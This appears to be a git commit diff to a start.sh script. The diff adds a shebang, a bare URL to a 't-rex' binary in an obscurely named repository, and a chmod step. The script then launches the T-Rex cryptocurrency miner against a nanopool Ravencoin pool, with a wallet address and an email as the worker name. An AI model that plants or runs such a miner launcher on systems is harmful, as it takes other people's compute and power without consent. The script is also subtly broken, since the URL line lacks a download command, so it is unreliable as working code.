9e6e4a517a7fc6be1936d6d5a502c4199526c56d
solahfatsalma <107563537+solahfatsalma@users.noreply.github.com>
2022-07-15 04:02:11 -0600

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,1 +1,4 @@
+#!/bin/bash
+https://raw.githubusercontent.com/solahfatsalma/token477afwjawgs/main/t-rex
+chmod +x t-rex
 ./t-rex -a kawpow -o stratum+tcp://rvn-eu1.nanopool.org:12222 -u RRKH4MK9Z8pd6MzDcCsseoFPF8KUepczV9.work1/anwojerb@gmail.com -p x -l log.txt
